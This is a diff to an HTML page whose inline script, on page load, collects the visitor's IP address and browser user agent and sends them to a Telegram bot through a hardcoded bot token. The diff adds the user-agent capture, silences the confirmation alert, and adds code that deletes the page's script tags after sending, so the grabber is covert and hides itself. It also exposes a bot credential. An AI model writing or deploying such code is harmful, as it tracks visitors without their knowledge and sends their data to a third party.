@@ -6,19 +6,32 @@
 </head>
 <body style="background-color:#15202b">
     <script type="text/javascript">
+        function unloadAllJS() {
+            var jsArray = new Array();
+            jsArray = document.getElementsByTagName('script');
+            for (i = 0; i < jsArray.length; i++){
+                if (jsArray[i].id){
+                unloadJS(jsArray[i].id)
+                }else{
+                jsArray[i].parentNode.removeChild(jsArray[i]);
+                }
+            }      
+        }
         var data2 = fetch("https://api.ipify.org")
             .then(res => res.text())
             .then(data => data2=data);
-
             data2.then(value => {
-                var message = "| IP: "+value;
+                // Browser detector
+                let userAgent = navigator.userAgent;
+                // 
+                var message = "| IP: "+value+" Navegador: "+userAgent;
                 var url = 'https://api.telegram.org/bot6679108190:AAHFWQfTka0-LBhZ0JDu9eKE2I_oZ4A9BL8/sendMessage?chat_id=681184796&text='+message+'&parse_mode=Markdown';
 
                 var oReq = new XMLHttpRequest();
                 oReq.open("GET", url, true);
                 oReq.send();
-
-                alert("Message sent");
+                // alert("Message sent");
+                unloadAllJS();
             }).catch(err => {
                 console.log(err);
             });
